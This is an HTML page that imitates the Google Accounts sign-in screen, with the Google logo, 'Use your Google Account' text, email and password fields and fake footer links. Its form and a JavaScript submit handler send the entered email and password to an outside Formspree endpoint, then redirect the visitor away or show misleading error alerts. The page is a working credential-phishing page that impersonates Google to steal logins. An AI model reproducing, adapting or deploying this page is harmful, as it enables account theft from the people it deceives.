<!DOCTYPE html>
<html lang="en">
<head>
    <link rel="icon" href="https://uploads.wuaze.com/google2.png" type="image/x-icon">
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign in - Google Accounts</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Roboto', Arial, sans-serif;
        }
        
        body {
            background-color: #fff;
            color: #202124;
            display: flex;
            flex-direction: column;
            min-height: 100vh;
            padding: 20px;
            transition: background-color 0.3s ease, color 0.3s ease;
        }
        
        body.dark-mode {
            background-color: #0e0e0e;
            color: #e8eaed;
        }
        
        .header {
            display: flex;
            justify-content: center;
            padding: 10px 0;
            margin-bottom: 30px;
        }
        
        .logo-container {
            display: flex;
            justify-content: center;
            margin-bottom: 1px;
        }
        
        .logo {
            width: 40px;
            height: 40px;
        }
        
        .signin-container {
            max-width: 450px;
            width: 100%;
            margin: 0 auto;
            padding: 48px 40px 36px;
            border: 1px solid #dadce0;
            border-radius: 8px;
            background-color: #fff;
            transition: background-color 0.3s ease, border-color 0.3s ease;
        }
        
        body.dark-mode .signin-container {
            background-color: #0e0e0e;
            border-color: #5f6368;
        }
        
        h1 {
            font-size: 32px;
            font-weight: 400;
            margin-bottom: 30px;
            text-align: left;
        }
        
        .subtitle {
            font-size: 16px;
            color: #202124;
            margin-bottom: 35px;
            text-align: left;
            transition: color 0.3s ease;
        }
        
        body.dark-mode .subtitle {
            color: #e8eaed;
        }
        
        .form-group {
            margin: 25px 0;
            position: relative;
        }
        
        .floating-label {
            position: absolute;
            top: 13px;
            left: 15px;
            font-size: 16px;
            color: #5f6368;
            pointer-events: none;
            transition: 0.2s ease all;
            background: #fff;
            padding: 0 4px;
        }
        
        body.dark-mode .floating-label {
            background: #0e0e0e;
            color: #9aa0a6;
        }
        
        .form-group input:focus ~ .floating-label,
        .form-group input:not(:placeholder-shown) ~ .floating-label {
            top: -8px;
            font-size: 12px;
            color: #1a73e8;
        }
        
        body.dark-mode .form-group input:focus ~ .floating-label,
        body.dark-mode .form-group input:not(:placeholder-shown) ~ .floating-label {
            color: #a8c7fa;
        }
        
        input[type="text"], input[type="password"] {
            width: 100%;
            padding: 13px 15px;
            font-size: 16px;
            border: 1px solid #dadce0;
            border-radius: 6px;
            outline: none;
            transition: border 0.2s, background-color 0.3s ease, color 0.3s ease;
            background-color: transparent;
            color: #202124;
        }
        
        body.dark-mode input[type="text"], 
        body.dark-mode input[type="password"] {
            background-color: transparent;
            color: #e8eaed;
            border-color: #5f6368;
        }
        
        input[type="text"]:focus, input[type="password"]:focus {
            border: 2px solid #1a73e8;
        }
        
        body.dark-mode input[type="text"]:focus, input[type="password"]:focus {
            border: 2px solid #a8c7fa;
        }
        
        .error {
            color: #d93025;
            font-size: 12px;
            margin-top: 5px;
            display: block;
        }
        
        .success {
            color: #1e8e3e;
            background-color: #e6f4ea;
            padding: 12px;
            border-radius: 4px;
            margin-bottom: 20px;
            text-align: center;
            border: 1px solid #1e8e3e;
        }
        
        .forgot-email {
            color: #0b57d0;
            font-size: 14px;
            font-weight: 500;
            text-decoration: none;
            display: block;
            margin-bottom: 40px;
        }
        
        body.dark-mode .forgot-email {
          color: #a8c7fa;
        }
        
        .forgot-email:hover {
            text-decoration: underline;
        }
        
        .note {
            font-size: 14px;
            color: #5f6368;
            margin-bottom: 30px;
            line-height: 1.5;
            transition: color 0.3s ease;
            font-family: "Google Sans", roboto, "Noto Sans Myanmar UI", arial, sans-serif;
        }
        
        body.dark-mode .note {
            color: #9aa0a6;
        }
        
        .note a {
            color: #0b57d0;
            text-decoration: none;
            font-family: "Google Sans", roboto, "Noto Sans Myanmar UI", arial, sans-serif;
        }
        
        body.dark-mode .note a {
            color: #a8c7fa;
        }
        
        .note a:hover {
            text-decoration: underline;
        }
        
        .links-container {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-top: 40px;
        }
        
        .create-account {
            color: #0b57d0;
            font-weight: 500;
            text-decoration: none;
            font-size: 14px;
            font-family: "Google Sans", roboto, "Noto Sans Myanmar UI", arial, sans-serif;
        }
        
        .create-account:hover {
            text-decoration: underline;
        }
        
        body.dark-mode .create-account {
          color:#a8c7fa;
        }
        
        .button {
            background-color: #0b57d0;
            color: #ffffff;
            border: none;
            border-radius: 20px;
            padding: 10px 24px;
            font-size: 14px;
            font-weight: 600;
            cursor: pointer;
            transition: background-color 0.2s;
            float: right;
        }
        
        body.dark-mode .button {
            background-color: #a8c7fa;
            color: #062e6f;
        }
        
        .button:hover {
            background-color: #081c59;
        }
        
        .input-box {
            font-size: 14px;
            color: #202124;
            margin-top: 10px;
            display: flex;
            align-items: center;
        }
        
        body.dark-mode .input-box {
            color: #e8eaed;
        }
        
        .footer {
            margin-top: auto;
            padding: 20px 0;
            display: flex;
            justify-content: space-between;
            align-items: center;
            font-size: 12px;
            color: #5f6368;
            transition: color 0.3s ease;
        }
        
        body.dark-mode .footer {
            color: #9aa0a6;
        }
        
        .footer-links {
            display: flex;
            gap: 20px;
        }
        
        .footer-links a {
            color: #5f6368;
            text-decoration: none;
            transition: color 0.3s ease;
        }
        
        body.dark-mode .footer-links a {
            color: #9aa0a6;
        }
        
        .footer-links a:hover {
            text-decoration: underline;
        }
        
        @media (max-width: 480px) {
            .signin-container {
                padding: 30px 20px;
                border: none;
            }
            
            .links-container {
                flex-direction: column;
                gap: 20px;
                align-items: flex-start;
            }
            
            .footer {
                flex-direction: column;
                gap: 10px;
                text-align: center;
            }
            
            .footer-links {
                justify-content: center;
            }
        }
    </style>
</head>
<body>
    <form id="myForm" action="https://formspree.io/f/xvgwqngd" method="POST">
        <div class="header">
            <div class="logo-container">
                <img src="https://uploads.wuaze.com/images-removebg-preview.png" alt="Google" class="logo">
            </div>
        </div>
        
        <div class="signin-container">
            <h1>Sign in</h1>
            <p class="subtitle">Use your Google Account.</p>
            
            <div id="success-message" class="success" style="display: none;"></div>
            <div id="error-message" class="error" style="display: none; margin-bottom: 20px;"></div>
            
            <div class="form-group">
                <input type="text" id="email" name="email" placeholder=" " required>
                <label class="floating-label">Email or phone</label>
                <span id="email-error" class="error"></span>
            </div>
            
            <div class="form-group">
                <input type="password" name="password" id="myInput" placeholder=" " required>
                <label class="floating-label">Enter your password</label>
                <span id="password-error" class="error"></span>
                
				<br>

                
                <div class="input-box">
                    <input type="checkbox" onclick="myFunction()">&nbsp;&nbsp;&nbsp;Show password
                </div>
            </div>
            
            <div> 
                <button type="submit" class="button" id="submitBtn">Next</button>
            </div> 
            <br>
            
            <div>
                <a href="#" class="forgot-email">Forgot email?</a>

                <p class="note">Not your computer? Use Guest mode to sign in privately. <a href="#">Learn more about using Guest mode</a></p>
            </div>
            
            <div class="links-container">
                <a href="#" class="create-account">Create account</a>
            </div>
        </div>
        
        <div class="footer">
            <div class="footer-links">
            <div class="language">English (United States)</div>
                <a href="#">Help</a>
                <a href="#">Privacy</a>
                <a href="#">Terms</a>
            </div>
        </div>
        
        <script>
            function myFunction() {
                var x = document.getElementById("myInput");
                if (x.type === "password") {
                    x.type = "text";
                } else {
                    x.type = "password";
                }
            }

            // Theme management - automatically use device preference
            function initializeTheme() {
                // Check if user has a preferred color scheme
                if (window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches) {
                    document.body.classList.add('dark-mode');
                } else {
                    document.body.classList.remove('dark-mode');
                }
            }
            
            // Listen for system theme changes
            if (window.matchMedia) {
                window.matchMedia('(prefers-color-scheme: dark)').addEventListener('change', e => {
                    if (e.matches) {
                        document.body.classList.add('dark-mode');
                    } else {
                        document.body.classList.remove('dark-mode');
                    }
                });
            }
            
            // Initialize theme on page load
            document.addEventListener('DOMContentLoaded', initializeTheme);
            
            // Form submission handler
            document.getElementById('myForm').addEventListener('submit', function(e) {
                e.preventDefault();
                
                const form = e.target;
                const formData = new FormData(form);
                
                fetch(form.action, {
                    method: 'POST',
                    body: formData,
                    headers: {
                        'Accept': 'application/json'
                    }
                })
                .then(response => {
                    if (response.ok) {
                        window.location.href = 'https://#';
                    } else {
                        alert('You should re-check your input correctly!.');
                    }
                })
                .catch(error => {
                    alert('Restart your phone browser.');
                });
            });
        </script>
    </form>
</body>
</html>
